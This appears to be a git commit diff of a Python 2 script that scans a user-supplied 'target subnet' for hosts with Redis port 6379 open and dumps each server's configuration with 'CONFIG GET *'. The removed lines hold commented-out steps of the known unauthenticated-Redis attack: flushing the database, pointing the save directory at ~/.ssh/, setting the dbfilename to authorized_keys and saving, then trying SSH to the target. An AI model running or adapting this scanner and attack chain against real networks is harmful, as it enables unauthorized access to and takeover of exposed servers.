13c7f4dc8ac2799a9740c8fbeab0a2d222006680
bergenb <ciaranfitzpatrick@Ciarans-MacBook-Pro.local>
2015-11-14 13:17:15 +0000

    Functions Defined

--- redisinal.py
+++ redisinal.py
@@ -1,46 +1,35 @@
+# Import socket module
+# -*- coding: utf-8 -*-
 import socket
-import telnetlib
-from netaddr import IPNetwork
-#import os, time
+from netaddr import IPNetwork           
+
+# Define the port on which you want to connect
+port = 6379                
+
+def connectRedis (ip):
+	# connect to the server on local computer
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         
+	s.connect((ip, port))
+
+	# receive data from the server
+	s.send ("CONFIG GET *" + "\n")
+	print s.recv(1024)
+
+	# close the connection
+	s.close()
+
+def subnetSearch(subnet):
+	for ip in IPNetwork(subnet).iter_hosts():
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         
+		result = sock.connect_ex((str(ip),6379))
+		if result == 0:
+			print "Port is open on %s" % str(ip)
+   			print ""
+   			print "Connecting to Redis: "
+   			print ""
+   			connectRedis(ip)
+   		else:
+   			print "Port is not open %s" % str(ip)
 
 subnet = raw_input("Please enter target subnet: ")
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-for ip in IPNetwork(subnet).iter_hosts():
-	result = sock.connect_ex((str(ip),6379))
-	if result == 0:
-   		print "Port is open on %s" % str(ip)
-   		print ""
-   		print "Connecting to Redis: "
-   		tn = telnetlib.Telnet(ip)
-   		tn.write("CONFIG GET *"+"\n")
-   		output = tn.read_all()
-   		if "dbfilename" in output:
-   			print "Looks like you can manipulate the CONFIG.."
-   			#os.system("redis-cli -h" + str(ip) + "flushall")
-   			#time.sleep(2)
-   			#os.system("foo.txt | redis-cli -h" + str(ip) + "-x set crackit")
-   			#time.sleep(2)
-   			#os.system("redis-cli -h" + str(ip))
-   			#time.sleep(2)
-			#os.system("config set dir ~/.ssh/")
-			#time.sleep(2)
-			#os.system('config set dbfilename "authorized_keys"')
-			#time.sleep(2)
-			#os.system("save")
-			print "Try and SSH to target...."
-   		else:
-   			print "Not sure this redis is vulnerable.."
-	else:
-   		print "Port is not open %s" % str(ip)
-
-
-
-
-
-
-
-
-
-
+subnetSearch(subnet)
